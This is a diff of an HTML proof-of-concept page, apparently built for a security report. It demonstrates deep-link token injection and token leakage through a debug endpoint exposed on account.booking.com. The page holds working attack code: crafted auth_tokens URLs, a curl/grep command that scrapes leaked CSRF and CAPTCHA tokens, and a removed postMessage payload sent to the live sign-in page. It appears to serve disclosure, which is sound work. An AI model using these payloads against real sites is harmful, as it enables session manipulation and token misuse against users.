@@ -13,6 +13,7 @@
         .s-red{border-color:#f85149}
         .s-grn{border-color:#3fb950}
         .s-org{border-color:#d29922}
+        .s-blue{border-color:#58a6ff}
         a{color:#58a6ff}
         code{background:#21262d;padding:1px 4px;border-radius:3px;font-size:11px;font-family:monospace}
         pre{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:6px;overflow-x:auto;white-space:pre-wrap;font-size:10px;color:#8b949e;margin:6px 0}
@@ -24,8 +25,8 @@
         button.warn{background:#9e6a03}
         button.warn:hover{background:#d29922}
         .bdg{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:bold}
-        .bdg-h{background:#f85149;color:#fff}
         .bdg-m{background:#d29922;color:#000}
+        .bdg-l{background:#388bfd;color:#fff}
         #log{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:6px;max-height:40vh;overflow-y:auto;font-size:10px;white-space:pre-wrap;margin-top:6px;line-height:1.4;font-family:monospace}
         .g{color:#3fb950}.w{color:#d29922}.r{color:#f85149}.b{color:#58a6ff}.d{color:#6e7681}
         table{border-collapse:collapse;width:100%;margin:6px 0;font-size:11px}
@@ -34,92 +35,144 @@
         #status{padding:10px;border-radius:6px;margin:8px 0;font-weight:bold;text-align:center;font-size:13px}
         .st-idle{background:#21262d;color:#8b949e}
         .st-go{background:#0f2d1a;color:#3fb950;border:1px solid #3fb950}
-        .st-app{background:#1a0f2d;color:#bc8cff;border:1px solid #bc8cff;animation:pulse 1s infinite}
         .st-cap{background:#2d1a0f;color:#f0883e;border:1px solid #f0883e;animation:pulse 1s infinite}
         @keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
         .cap{background:#1a0f0f;border:1px solid #f85149;padding:8px;border-radius:6px;margin:6px 0;word-break:break-all;font-size:10px;font-family:monospace}
-        .evidence{background:#0f1a0f;border:1px solid #3fb950;padding:8px;border-radius:6px;margin:6px 0;font-size:11px}
-        .ts{color:#6e7681;font-size:10px}
+        .step{background:#0d1117;border-left:3px solid #f0883e;padding:8px 10px;margin:6px 0;font-size:12px}
+        .step b{color:#f0883e}
         ol{padding-left:18px;font-size:12px}
-        ol li{margin-bottom:4px}
+        ol li{margin-bottom:6px}
+        .warn-box{background:#2d1a00;border:1px solid #d29922;border-radius:6px;padding:10px;margin:8px 0;font-size:12px;color:#d29922}
         @media(max-width:600px){body{padding:6px}button{padding:14px;font-size:15px}.s{padding:10px}}
     </style>
 </head>
 <body>
 
-<h1>PoC: Android App Link Hijack via Debug Endpoint</h1>
+<h1>PoC: Deep Link Token Injection via Debug Endpoint</h1>
 <p><strong>Target:</strong> <code>account.booking.com/mock_webview</code><br>
-<span class="bdg bdg-h">HIGH</span> App Link Parameter Injection + <span class="bdg bdg-m">MEDIUM</span> Info Disclosure</p>
+<span class="bdg bdg-m">MEDIUM</span> Security Misconfiguration + Deep Link Injection + Info Disclosure</p>
 
-<div id="status" class="st-idle">Ready &mdash; tap an attack button</div>
+<div id="status" class="st-idle">Ready &mdash; follow the steps below</div>
 
-<!-- ══════ FINDING SUMMARY ══════ -->
+<!-- ══════ VULNERABILITY SUMMARY ══════ -->
 <div class="s s-org">
     <h2>Vulnerability Summary</h2>
     <p style="font-size:12px;margin:0">A development debug endpoint (<code>/mock_webview</code>) is
-    exposed on production at <code>account.booking.com</code>. Android App Links
-    (<code>handle_all_urls</code>) intercepts <strong>all URLs</strong> on this domain and passes
-    them — including attacker-crafted query parameters — directly to the native Booking.com app.
-    An attacker can inject arbitrary <code>auth_tokens</code> into the app via a single crafted link.</p>
+    exposed on the production <code>account.booking.com</code> domain. The page explicitly states
+    <em>"This is a Mock page for WebView demo, it should not be exposed on production."</em></p>
+    <p style="font-size:12px;margin:6px 0 0 0">The page accepts attacker-controlled
+    <code>auth_tokens</code> and <code>context</code> URL parameters, which get injected into a
+    <code>booking://close_webview</code> deep link. When a victim taps the
+    <strong>"Exit WebView page"</strong> button, the Booking.com native app opens and
+    receives the attacker-controlled tokens. Additionally, the page leaks sensitive tokens
+    (<code>as_token</code>, <code>captcha_access_key</code>, <code>jset</code>, <code>xState</code>)
+    in the HTML source to any unauthenticated visitor.</p>
 </div>
 
-<!-- ══════ ATTACK 1: APP LINK HIJACK ══════ -->
+<!-- ══════ ATTACK: DEEP LINK INJECTION ══════ -->
 <div class="s s-red">
-    <h2>Attack 1 &mdash; Android App Link Injection (PRIMARY)</h2>
-    <p style="font-size:12px">Opens <code>account.booking.com/mock_webview</code> with
-    attacker-controlled <code>auth_tokens</code>. On Android with the Booking.com app
-    installed, the OS intercepts the URL and passes it (with attacker params) to the
-    native app via Intent.</p>
-    <button onclick="attackAppLink()">LAUNCH: App Link Token Injection</button>
-    <p style="font-size:11px;color:#8b949e;margin:4px 0 0 0">
-    <strong>Expected on Android:</strong> Booking.com app opens.
-    The app receives <code>auth_tokens=PoC_ATTACKER_TOKEN</code> in the Intent data.<br>
-    <strong>Expected on Desktop:</strong> Page opens in browser showing debug page.</p>
-</div>
-
-<!-- ══════ ATTACK 2: BROWSER FALLBACK ══════ -->
-<div class="s s-red">
-    <h2>Attack 2 &mdash; Debug Page + Deep Link (Desktop/Browser)</h2>
-    <p style="font-size:12px">If tested in a desktop browser or the app doesn't intercept,
-    the debug page renders with the "Exit WebView page" button containing a
-    <code>booking://close_webview</code> deep link with injected tokens.</p>
-    <button class="sec" onclick="attackBrowser()">LAUNCH: Browser Deep Link Injection</button>
-</div>
-
-<!-- ══════ ATTACK 3: postMessage ══════ -->
-<div class="s">
-    <h2>Attack 3 &mdash; postMessage Origin Bypass</h2>
-    <p style="font-size:12px">Opens the sign-in page as a popup and sends
-    <code>iam-ifr-email</code> with an attacker email. The handler has
-    <strong>no origin check</strong>.</p>
-    <button class="warn" onclick="attackPostMsg()">LAUNCH: postMessage Probe</button>
-</div>
-
-<!-- ══════ CAPTURED DATA ══════ -->
-<div class="s s-grn">
-    <h2>Captured Evidence</h2>
-    <div id="captured">
-        <em class="d">No events captured yet. Run an attack above.</em>
+    <h2>Step 1 &mdash; Open Debug Page with Injected Tokens</h2>
+    <p style="font-size:12px">This opens the exposed debug page with attacker-controlled
+    <code>auth_tokens</code> injected into the URL. The page loads in the browser.</p>
+    <button onclick="launchAttack()">OPEN: mock_webview with Injected auth_tokens</button>
+    <div class="step">
+        <b>What happens:</b> The <code>/mock_webview</code> debug page loads. It renders an
+        <strong>"Exit WebView page"</strong> button whose <code>href</code> contains:<br>
+        <code>booking://close_webview?context=<span style="color:#f85149">ATTACKER_CTX</span>&amp;auth_tokens=<span style="color:#f85149">ATTACKER_TOKEN</span>&amp;next_step=STEP_SUCCESS</code>
     </div>
 </div>
 
-<!-- ══════ LIVE LOG ══════ -->
+<div class="s s-red">
+    <h2>Step 2 &mdash; Tap "Exit WebView page" Button</h2>
+    <p style="font-size:12px">On the mock_webview page that opened, tap the
+    <strong>"Exit WebView page"</strong> button.</p>
+    <div class="step">
+        <b>What happens on mobile (with Booking.com app):</b><br>
+        The <code>booking://</code> deep link fires. The Booking.com native app opens and receives
+        the attacker-injected <code>auth_tokens</code> value via the deep link handler.<br><br>
+        <b>What happens on desktop:</b><br>
+        The browser shows a protocol handler prompt for <code>booking://</code>.
+    </div>
+    <div class="warn-box">
+        <strong>Attack scenario:</strong> An attacker sends a victim a link like
+        <code>https://account.booking.com/mock_webview?auth_tokens=EVIL</code> via
+        email/SMS/chat. The victim sees a legitimate Booking.com page. They tap
+        "Exit WebView page" and the native app opens with the attacker's injected tokens.
+    </div>
+</div>
+
+<!-- ══════ TOKEN VERIFICATION ══════ -->
+<div class="s s-blue">
+    <h2>Step 3 &mdash; Verify Token Leakage (Desktop)</h2>
+    <p style="font-size:12px">The leaked tokens are in the <strong>HTML source code</strong> of
+    the mock_webview page (not visible on this PoC page). To verify:</p>
+    <ol>
+        <li>Open <code>https://account.booking.com/mock_webview</code> in a <strong>desktop browser</strong></li>
+        <li>Press <strong>Ctrl+U</strong> (View Page Source)</li>
+        <li>Press <strong>Ctrl+F</strong> and search for <code>booking.env</code></li>
+        <li>You will see the JSON object containing all leaked tokens</li>
+    </ol>
+    <button class="sec" onclick="openForSource()">OPEN mock_webview (for View Source)</button>
+    <p style="font-size:11px;color:#8b949e;margin:4px 0 0 0">
+    On mobile: long-press the URL and choose "Open in new tab", then use
+    the browser menu &rarr; "View page source" or add <code>view-source:</code> before the URL.</p>
+</div>
+
+<div class="s">
+    <h2>Token Leakage Evidence (from page source)</h2>
+    <p style="font-size:11px">The following tokens are exposed in <code>booking.env={...}</code>
+    inside the HTML source of <code>/mock_webview</code>. These are server-generated,
+    per-request tokens leaked to <strong>any unauthenticated visitor</strong>:</p>
+    <table>
+        <tr><th>Token</th><th>Type</th><th>How to find</th></tr>
+        <tr><td><code>as_token</code></td><td>Anti-CSRF token (~166 bytes)</td><td>Search source for <code>"as_token"</code></td></tr>
+        <tr><td><code>captcha_access_key</code></td><td>CAPTCHA bypass credential (~500 bytes)</td><td>Search source for <code>"captcha_access_key"</code></td></tr>
+        <tr><td><code>jset</code></td><td>Encrypted session state</td><td>Search source for <code>"jset"</code></td></tr>
+        <tr><td><code>xState</code></td><td>Serialized auth state</td><td>Search source for <code>"xState"</code></td></tr>
+        <tr><td><code>oauth.client_id</code></td><td>OAuth client ID</td><td><code>vO1Kblk7xX9tUn2cpZLS</code></td></tr>
+    </table>
+    <p style="font-size:11px;color:#8b949e">These tokens are NOT visible on this PoC page
+    (cross-origin restrictions prevent reading them). They must be verified by viewing
+    the source of the target page directly.</p>
+
+    <p style="font-size:11px"><strong>Terminal verification command:</strong></p>
+    <pre>curl -sS 'https://account.booking.com/mock_webview' | grep -oP '"(as_token|captcha_access_key|xState|jset)"\s*:\s*"[^"]{0,40}'</pre>
+</div>
+
+<!-- ══════ CAPTURED EVENTS ══════ -->
+<div class="s s-grn">
+    <h2>Captured Events</h2>
+    <p style="font-size:11px">Activity from the buttons above is logged here for screenshot evidence:</p>
+    <div id="captured">
+        <em class="d">No events captured yet.</em>
+    </div>
+</div>
+
+<!-- ══════ EVENT LOG ══════ -->
 <div class="s">
     <h2>Event Log</h2>
     <div id="log"></div>
     <button onclick="document.getElementById('log').innerHTML='';L('Log cleared','d')" style="background:#21262d;margin-top:4px;font-size:12px;padding:8px">Clear</button>
 </div>
 
-<!-- ══════ TECHNICAL EVIDENCE ══════ -->
+<!-- ══════ TECHNICAL DETAILS ══════ -->
 <div class="s">
-    <h2>Technical Evidence: Android App Links</h2>
-    <p style="font-size:11px"><code>account.booking.com/.well-known/assetlinks.json</code>
-    grants <code>handle_all_urls</code> to the Booking.com Android app:</p>
+    <h2>Technical Details</h2>
+
+    <p style="font-size:11px"><strong>1. Deep Link Construction (client-side JavaScript):</strong></p>
+    <pre>// From index_018bcd78ecaca9240cea.js — /mock_webview route handler
+var n = new URLSearchParams(location.search),
+    t = n.get("auth_tokens"),       // &lt;-- Attacker-controlled
+    i = {
+        context: n.get("context"),  // &lt;-- Attacker-controlled
+        auth_tokens: t || "",
+        next_step: "STEP_SUCCESS"
+    };
+// Renders &lt;a href="booking://close_webview?context=EVIL&amp;auth_tokens=EVIL&amp;next_step=STEP_SUCCESS"&gt;</pre>
+
+    <p style="font-size:11px"><strong>2. Android Digital Asset Links (<code>assetlinks.json</code>):</strong></p>
     <pre>{
-  "relation": [
-    "delegate_permission/common.get_login_creds",
-    "delegate_permission/common.handle_all_urls"
-  ],
+  "relation": ["delegate_permission/common.handle_all_urls"],
   "target": {
     "namespace": "android_app",
     "package_name": "com.booking",
@@ -128,38 +181,36 @@
     ]
   }
 }</pre>
-    <p style="font-size:11px"><strong>Result:</strong> ANY URL on <code>account.booking.com</code>
-    is intercepted by the Android app. The full URL — including query params like
-    <code>?auth_tokens=EVIL</code> — arrives in the app's Intent as <code>Intent.getData()</code>.</p>
-</div>
 
-<div class="s">
-    <h2>Technical Evidence: Token Leakage</h2>
-    <p style="font-size:11px">Every request to <code>/mock_webview</code> leaks these in
-    <code>booking.env</code> (no auth required):</p>
-    <table>
-        <tr><th>Token</th><th>Use</th></tr>
-        <tr><td><code>as_token</code></td><td>Anti-CSRF (X-Booking-CSRF header)</td></tr>
-        <tr><td><code>captcha_access_key</code></td><td>CAPTCHA bypass credential</td></tr>
-        <tr><td><code>jset</code></td><td>Encrypted session state</td></tr>
-        <tr><td><code>xState</code></td><td>Auth state blob</td></tr>
-        <tr><td><code>oauth.client_id</code></td><td><code>vO1Kblk7xX9tUn2cpZLS</code></td></tr>
-    </table>
+    <p style="font-size:11px"><strong>3. Server-side integration — STEP_URL routes to /mock_webview:</strong></p>
+    <pre>// Chunk 9329 — step routing (line 4256)
+STEP_URL: r.A.mockWebViewPage.path   // Server maps STEP_URL → "/mock_webview"
+
+// STEP_URL handler copies ALL URL params to destination:
+new URLSearchParams(window.location.search).forEach(function(e, n) {
+    return s.searchParams.set(n, e)   // Forwards ALL params
+})</pre>
 </div>
 
 <!-- ══════ REPRODUCTION ══════ -->
 <div class="s">
-    <h2>Reproduction Steps</h2>
+    <h2>Full Reproduction Steps</h2>
     <ol>
-        <li>Install Booking.com app on Android device</li>
-        <li>Open this PoC page in Chrome on the same device</li>
-        <li>Tap <strong>"LAUNCH: App Link Token Injection"</strong></li>
-        <li><strong>Observe:</strong> Booking.com app opens (NOT the browser)</li>
-        <li>The app received the full URL including <code>?auth_tokens=PoC_ATTACKER_TOKEN</code></li>
-        <li>Return to this page &mdash; the event log records the app launch</li>
-        <li><strong>Desktop verification:</strong> Open
-            <code>https://account.booking.com/mock_webview</code> in a browser &mdash;
-            see the debug message and leaked tokens in page source</li>
+        <li><strong>Desktop — Verify debug page exists:</strong><br>
+            Open <code>https://account.booking.com/mock_webview</code><br>
+            Observe: <em>"This is a Mock page for WebView demo, it should not be exposed on production."</em></li>
+        <li><strong>Desktop — Verify token leakage:</strong><br>
+            View Page Source (Ctrl+U) &rarr; search for <code>booking.env</code><br>
+            Observe: <code>as_token</code>, <code>captcha_access_key</code>, <code>jset</code>,
+            <code>xState</code> all present</li>
+        <li><strong>Desktop — Verify deep link injection:</strong><br>
+            Open <code>https://account.booking.com/mock_webview?auth_tokens=INJECTED&amp;context=TEST</code><br>
+            Inspect the "Exit WebView page" button &rarr; <code>href</code> contains
+            <code>booking://close_webview?auth_tokens=INJECTED...</code></li>
+        <li><strong>Mobile — Verify native app receives injected tokens:</strong><br>
+            Open the same URL on a phone with the Booking.com app installed<br>
+            Tap "Exit WebView page" &rarr; the Booking.com app opens with the
+            attacker-controlled <code>auth_tokens</code> value</li>
     </ol>
 </div>
 
@@ -170,13 +221,10 @@
     var logEl  = document.getElementById('log');
     var capEl  = document.getElementById('captured');
     var statEl = document.getElementById('status');
-    var popup  = null;
     var capN   = 0;
-    var pollId = null;
-    var lastAttack  = null;
-    var attackStart = null;
+    var lastAction  = null;
+    var actionStart = null;
 
-    // ── Helpers ──
     function L(msg, cls) {
         var ts = new Date().toLocaleTimeString();
         logEl.innerHTML += '<span class="'+(cls||'')+'">['+ts+'] '+esc(msg)+'</span>\n';
@@ -195,212 +243,121 @@
         statEl.className = cls;
     }
 
-    function addCap(label, data, type) {
+    function addCap(label, data, icon) {
         capN++;
         if (capN === 1) capEl.innerHTML = '';
         var div = document.createElement('div');
         div.className = 'cap';
         var ts = new Date().toLocaleTimeString();
-        var icon = type === 'app' ? '\u{1F4F1}' : type === 'msg' ? '\u{1F4E8}' : '\u{1F50D}';
-        div.innerHTML = '<strong class="w">' + icon + ' #'+capN+' ['+esc(ts)+'] '+esc(label)+'</strong><br><code>'+esc(typeof data==='string'?data:JSON.stringify(data,null,1))+'</code>';
+        div.innerHTML = '<strong class="w">' + (icon||'') + ' #'+capN+' ['+esc(ts)+'] '+esc(label)+'</strong><br><code>'+esc(typeof data==='string'?data:JSON.stringify(data,null,1))+'</code>';
         capEl.appendChild(div);
         L('CAPTURED #'+capN+': '+label, 'r');
     }
 
-    // ── Visibility API: detect when user returns from native app ──
+    // Detect tab switches (user goes to mock_webview tab, then returns)
     document.addEventListener('visibilitychange', function() {
-        if (document.visibilityState === 'hidden' && lastAttack) {
-            L('Page went to background (app opened or tab switched)', 'w');
-            addCap('PAGE HIDDEN — native app likely launched', 'Attack: ' + lastAttack + ' | URL opened at: ' + new Date(attackStart).toLocaleTimeString(), 'app');
-            setSt('APP LAUNCHED — Booking.com app intercepted the URL', 'st-app');
+        if (!lastAction) return;
+        if (document.visibilityState === 'hidden') {
+            L('Page hidden — user switched to target page', 'w');
+            addCap('User navigated to target page', 'Action: ' + lastAction + '\nOpened at: ' + new Date(actionStart).toLocaleTimeString(), '\u{1F50D}');
         }
-        if (document.visibilityState === 'visible' && lastAttack && attackStart) {
-            var elapsed = ((Date.now() - attackStart) / 1000).toFixed(1);
-            L('Page visible again after ' + elapsed + 's', 'g');
-            addCap('USER RETURNED after ' + elapsed + 's', 'The Booking.com app opened and the user returned. Elapsed: ' + elapsed + 's. The app received the full URL with attacker-injected auth_tokens parameter via Android App Links Intent.', 'app');
-            setSt('EVIDENCE CAPTURED — User returned from app (' + elapsed + 's)', 'st-cap');
-            lastAttack = null;
-            attackStart = null;
+        if (document.visibilityState === 'visible' && actionStart) {
+            var elapsed = ((Date.now() - actionStart) / 1000).toFixed(1);
+            L('User returned after ' + elapsed + 's', 'g');
+            addCap('User returned (' + elapsed + 's on target)', 'Action: ' + lastAction + '\nTime on target page: ' + elapsed + 's\n\nIf on mobile: the "Exit WebView page" button triggers booking://close_webview with attacker auth_tokens, opening the native Booking.com app.', '\u{1F4F1}');
+            setSt('Evidence captured — ' + elapsed + 's on target page', 'st-cap');
+            lastAction = null;
+            actionStart = null;
         }
     });
 
-    // ── postMessage Listener ──
+    // Listen for any postMessage from the target
     window.addEventListener('message', function(evt) {
         var origin = evt.origin || '(null)';
+        L('postMessage received from ' + origin, 'r');
         var data = evt.data;
-        L('postMessage received! origin=' + origin, 'r');
         if (typeof data === 'string') {
-            try {
-                var p = JSON.parse(data);
-                L('  JSON: ' + JSON.stringify(p), 'w');
-                addCap('postMessage from ' + origin, p, 'msg');
-            } catch(e) {
-                L('  raw: ' + data.substring(0, 200), 'w');
-                addCap('postMessage (raw) from ' + origin, data.substring(0, 500), 'msg');
-            }
-        } else if (typeof data === 'object' && data !== null) {
-            L('  obj: ' + JSON.stringify(data).substring(0, 200), 'w');
-            addCap('postMessage (obj) from ' + origin, data, 'msg');
+            try { data = JSON.parse(data); } catch(e) {}
         }
+        addCap('postMessage from ' + origin, data, '\u{1F4E8}');
     });
 
-    // ── Popup monitoring ──
-    function monitor() {
-        if (pollId) clearInterval(pollId);
-        pollId = setInterval(function() {
-            if (!popup || popup.closed) {
-                L('Target window closed.', 'd');
-                clearInterval(pollId);
-                pollId = null;
-                return;
-            }
-            try {
-                var loc = popup.location.href;
-                if (loc && loc.indexOf('booking.com') === -1) {
-                    addCap('Popup URL readable (same-origin leak)', loc, 'msg');
-                }
-            } catch(e) { /* cross-origin, expected */ }
-        }, 1000);
-    }
-
-    function openURL(url, label) {
-        lastAttack = label;
-        attackStart = Date.now();
-        L('Opening: ' + url, 'b');
-        setSt('ACTIVE — opened target URL...', 'st-go');
-
-        // Log the attack parameters
-        var params = url.split('?')[1];
-        if (params) {
-            L('Injected params: ' + params, 'w');
-            addCap('Attack launched: ' + label, 'URL: ' + url + '\nParams: ' + decodeURIComponent(params), 'app');
-        }
-
-        popup = window.open(url, 'bk_target');
-        if (!popup) {
-            L('Pop-up BLOCKED. Allow pop-ups for this site.', 'r');
-            setSt('BLOCKED — allow pop-ups and retry', 'st-idle');
-            return false;
-        }
-        L('Window/app launched. Waiting for response...', 'g');
-        monitor();
-        return true;
-    }
-
-    // ════════════════════════════════════════
-    // ATTACK 1: Android App Link Token Injection
-    // ════════════════════════════════════════
-    window.attackAppLink = function() {
-        L('', 'd');
-        L('========================================', 'r');
-        L('ATTACK 1: Android App Link Token Injection', 'r');
-        L('========================================', 'r');
-        L('', 'd');
-        L('Vector: account.booking.com assetlinks.json grants handle_all_urls to com.booking', 'b');
-        L('The OS intercepts ALL URLs on this domain and passes them to the native app.', 'b');
-        L('', 'd');
-
+    // ── Main attack: deep link injection ──
+    window.launchAttack = function() {
         var token = 'PoC_ATTACKER_TOKEN_' + Date.now();
         var ctx   = 'PoC_ATTACKER_CTX_' + Math.random().toString(36).substring(2,8);
         var url = 'https://account.booking.com/mock_webview'
                 + '?auth_tokens=' + encodeURIComponent(token)
                 + '&context=' + encodeURIComponent(ctx);
 
+        lastAction = 'Deep Link Injection';
+        actionStart = Date.now();
+
+        L('', 'd');
+        L('========================================', 'r');
+        L('DEEP LINK TOKEN INJECTION', 'r');
+        L('========================================', 'r');
+        L('', 'd');
+        L('Crafted URL: ' + url, 'b');
         L('Injected auth_tokens: ' + token, 'w');
         L('Injected context: ' + ctx, 'w');
+        L('', 'd');
 
-        if (openURL(url, 'App Link Injection')) {
-            L('', 'd');
-            L('ON ANDROID: The Booking.com app should open now.', 'r');
-            L('The app receives Intent with data:', 'r');
-            L('  intent.getData() = ' + url, 'w');
-            L('  auth_tokens = ' + token, 'w');
-            L('  context = ' + ctx, 'w');
-            L('', 'd');
-            L('ON DESKTOP: The debug page opens in the browser.', 'd');
-            L('Check the "Exit WebView page" button href for booking://close_webview', 'd');
-            L('', 'd');
-            L('RETURN TO THIS PAGE to capture the round-trip evidence.', 'g');
-        }
+        addCap('Attack launched: Deep Link Injection',
+            'URL: ' + url +
+            '\nInjected auth_tokens: ' + token +
+            '\nInjected context: ' + ctx +
+            '\n\nExpected deep link on target page:\nbooking://close_webview?context=' + ctx + '&auth_tokens=' + token + '&next_step=STEP_SUCCESS', '\u{1F680}');
+
+        setSt('Opening target page...', 'st-go');
+        window.open(url, '_blank');
+
+        L('Target page opened in new tab.', 'g');
+        L('', 'd');
+        L('ON THE TARGET PAGE:', 'w');
+        L('  1. You should see "This is a Mock page for WebView demo"', 'b');
+        L('  2. There is an "Exit WebView page" button', 'b');
+        L('  3. That button href = booking://close_webview?auth_tokens=' + token + '...', 'r');
+        L('  4. TAP THE BUTTON on mobile to trigger the deep link', 'r');
+        L('  5. The Booking.com app opens with the attacker tokens', 'r');
+        L('', 'd');
+        L('Return to this page after testing. The event will be logged.', 'g');
     };
 
-    // ════════════════════════════════════════
-    // ATTACK 2: Browser Deep Link
-    // ════════════════════════════════════════
-    window.attackBrowser = function() {
+    // ── View source helper ──
+    window.openForSource = function() {
+        lastAction = 'View Source Verification';
+        actionStart = Date.now();
+
+        var url = 'https://account.booking.com/mock_webview';
         L('', 'd');
         L('========================================', 'b');
-        L('ATTACK 2: Browser Deep Link Injection', 'b');
+        L('TOKEN LEAKAGE VERIFICATION', 'b');
         L('========================================', 'b');
+        L('Opening: ' + url, 'b');
+        L('On that page: View Source (Ctrl+U) > search "booking.env"', 'w');
+        L('Look for: as_token, captcha_access_key, jset, xState', 'w');
 
-        var url = 'https://account.booking.com/mock_webview'
-                + '?auth_tokens=BROWSER_ATTACKER_TOKEN'
-                + '&context=BROWSER_ATTACKER_CTX';
+        addCap('Token verification launched',
+            'URL: ' + url +
+            '\n\nView Page Source and search for:\n  - "as_token" (Anti-CSRF token)\n  - "captcha_access_key" (CAPTCHA credential)\n  - "jset" (encrypted session state)\n  - "xState" (auth state)', '\u{1F50D}');
 
-        if (openURL(url, 'Browser Deep Link')) {
-            L('On the target page:', 'g');
-            L('  1. Look for "should not be exposed on production" message', 'b');
-            L('  2. Inspect "Exit WebView page" button', 'b');
-            L('  3. Check href = booking://close_webview?auth_tokens=BROWSER_ATTACKER_TOKEN...', 'w');
-            L('  4. View Source > search "booking.env" for leaked tokens', 'b');
-        }
-    };
-
-    // ════════════════════════════════════════
-    // ATTACK 3: postMessage
-    // ════════════════════════════════════════
-    window.attackPostMsg = function() {
-        L('', 'd');
-        L('========================================', 'w');
-        L('ATTACK 3: postMessage Origin Bypass', 'w');
-        L('========================================', 'w');
-
-        var url = 'https://account.booking.com/sign-in';
-        if (openURL(url, 'postMessage Probe')) {
-            L('Listening for messages from target...', 'b');
-
-            setTimeout(function() {
-                if (popup && !popup.closed) {
-                    var payload = JSON.stringify({message:"iam-ifr-email",email:"attacker@evil.com"});
-                    L('SENDING to target: ' + payload, 'w');
-                    try {
-                        popup.postMessage(payload, "*");
-                        L('SENT. If email field shows attacker@evil.com, origin check is MISSING.', 'r');
-                        addCap('postMessage sent to sign-in page', 'Payload: ' + payload + '\nTarget accepts from any origin (no event.origin check)', 'msg');
-                    } catch(e) {
-                        L('Send failed: ' + e.message, 'r');
-                    }
-
-                    setTimeout(function() {
-                        if (popup && !popup.closed) {
-                            var nav = JSON.stringify({message:"set-step",step:"register"});
-                            L('SENDING navigation: ' + nav, 'w');
-                            try {
-                                popup.postMessage(nav, "*");
-                                L('SENT. If page navigates to /register, origin check is MISSING.', 'r');
-                                addCap('set-step sent to sign-in page', 'Payload: ' + nav + '\nAttempting to navigate victim to register page', 'msg');
-                            } catch(e) {
-                                L('Send failed: ' + e.message, 'r');
-                            }
-                        }
-                    }, 2500);
-                }
-            }, 3000);
-        }
+        setSt('Opening target for source verification...', 'st-go');
+        window.open(url, '_blank');
+        L('Page opened. Use Ctrl+U to view source.', 'g');
     };
 
     // ── Init ──
     var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
     L('PoC loaded. Platform: ' + (isMobile ? 'MOBILE' : 'DESKTOP'), 'g');
-    L('User-Agent: ' + navigator.userAgent.substring(0, 80), 'd');
     if (isMobile) {
-        L('MOBILE DETECTED — App Link attacks are relevant.', 'r');
-        L('Android assetlinks.json grants handle_all_urls to com.booking', 'w');
-        L('All account.booking.com URLs will be intercepted by the app.', 'w');
+        L('MOBILE: Tap Step 1 button, then tap "Exit WebView page" on the target page.', 'w');
+        L('The Booking.com app will open with attacker-injected auth_tokens.', 'r');
     } else {
-        L('Desktop detected — deep link + postMessage attacks apply.', 'b');
+        L('DESKTOP: Use Step 1 to verify the deep link injection.', 'b');
+        L('Use Step 3 to verify token leakage in page source.', 'b');
     }
-    L('Visibility API active — will detect app launches and returns.', 'b');
+    L('All events are logged here for screenshot evidence.', 'd');
     L('', 'd');
 })();
 </script>
